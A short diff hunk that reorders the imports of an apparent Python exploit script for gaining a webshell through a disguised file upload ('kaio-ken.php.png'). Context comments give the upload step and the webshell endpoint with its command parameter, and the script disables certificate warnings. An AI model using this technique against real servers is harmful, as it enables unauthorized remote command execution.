@@ -35,8 +35,15 @@
 #   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png'; 
 #   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
 
-import requests, sys, urllib.request, urllib.parse, urllib.error, re
-from colorama import Fore, Back, Style
+import re
+import sys
+import urllib.error
+import urllib.parse
+import urllib.request
+
+import requests
+from colorama import Back, Fore, Style
+
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 def webshell(SERVER_URL, session):
